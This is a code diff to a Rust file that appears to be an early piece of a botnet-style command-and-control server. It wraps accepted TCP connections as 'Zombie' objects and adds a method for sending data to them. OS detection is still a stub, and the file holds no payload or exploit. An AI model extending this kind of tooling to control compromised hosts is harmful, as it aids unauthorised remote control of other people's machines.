@@ -1,6 +1,7 @@
 use std::fmt::Debug;
+use std::io::Write;
 use std::net::{IpAddr, Ipv4Addr, TcpListener, TcpStream};
-use log::debug;
+use log::{debug, error, trace};
 
 #[derive(Debug)]
 pub enum System {
@@ -23,6 +24,7 @@ pub struct Zombie {
 fn find_system(connection: &mut TcpStream) -> System {
     System::NotFound // Not implemented yet
 }
+
 impl Zombie {
     pub fn new(mut connection: TcpStream) -> Result<Zombie, std::io::Error> {
         Ok(
@@ -34,11 +36,18 @@ impl Zombie {
             }
         )
     }
+
+    pub fn send_data(&mut self, data: &[u8]) {
+        match self.tcp_stream.write(data) {
+            Ok(size) => trace!("Written {size} bytes!"),
+            Err(e) => error!("Error writing to zombie!\n{e}")
+        };
+    }
 }
 
 
 
-pub fn craft_zombie(mut connection: TcpStream) -> Result<Zombie, std::io::Error> {
+pub fn craft_zombie(connection: TcpStream) -> Result<Zombie, std::io::Error> {
     debug!("Caught connection! {connection:?}");
     Zombie::new(connection)
 }
